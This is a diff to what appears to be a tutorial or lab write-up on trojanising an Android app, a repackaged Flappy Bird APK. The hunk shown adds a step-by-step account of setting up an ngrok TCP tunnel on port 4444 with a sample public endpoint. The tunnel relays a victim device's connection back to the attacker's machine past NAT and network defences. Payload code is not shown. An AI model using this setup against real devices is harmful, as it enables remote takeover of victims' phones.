@@ -50,17 +50,34 @@ For this demonstration, a Flappy Bird APK downloaded from APKpure.com was utiliz
 
 #### Ngrok Tunnel Configuration
 
-To establish a connection pathway from the victim device to our attack infrastructure, I configured Ngrok to create a secure tunnel. 
+To establish a connection pathway from the victim device to mine attack infrastructure, I configured Ngrok to create a secure tunnel. Ngrok provides a public endpoint that forwards traffic to our local attack machine.
 
-Ngrok provides a public endpoint that forwards traffic to our local attack machine.
-
-**Command executed:**
+Command executed:
 
 ```ngrok tcp 4444```
 
-This creates a TCP tunnel on port 4444, providing us with a public domain and port combination that will be used in our payload configuration.
+Command's output:
+![Output ngrok](ngrok.png)
 
-![Output comando](ngrok.png)
+#### Ngrok Tunnel Operation Details:
+
+When executing the ngrok tcp 4444 command, a secure connection is established between the local computer and Ngrok's servers. This process creates a tunneling mechanism that operates as follows:
+
+1. **Public Service Exposure**: Ngrok initiates a procedure that publicly exposes any TCP service listening on port 4444 of the local computer to the Internet.
+2. **Dynamic Address Assignment**: The service provides a public address in the format tcp://X.tcp.ngrok.io:YYYYY, where:
+ - X represents a randomly assigned hostname by Ngrok servers
+ - YYYYY represents a randomly assigned port number by Ngrok servers
+
+3. **Tunnel Establishment**: A secure tunnel is established between the local computer and Ngrok’s servers. The Ngrok client receives incoming traffic through this tunnel and forwards it locally to port 4444 on the machine executing the command.
+This setup creates a bidirectional communication channel, where external traffic sent to the public Ngrok endpoint is seamlessly forwarded to the local service.
+
+**NAT Traversal Capability**: This service enables the creation of virtual connections between two devices even when both have private IP addresses, effectively bypassing Network Address Translation (NAT) restrictions.
+
+Practical Example:
+
+In our demonstration, TCP traffic directed to the address ```6.tcp.eu.ngrok.io:16690``` is automatically transmitted by Ngrok to port 4444 of the attacker's computer, creating a seamless communication channel that bypasses typical network security barriers.
+
+![ngrok map](ngrokmap.jpg)
 
 
 ### 3. Payload Generation
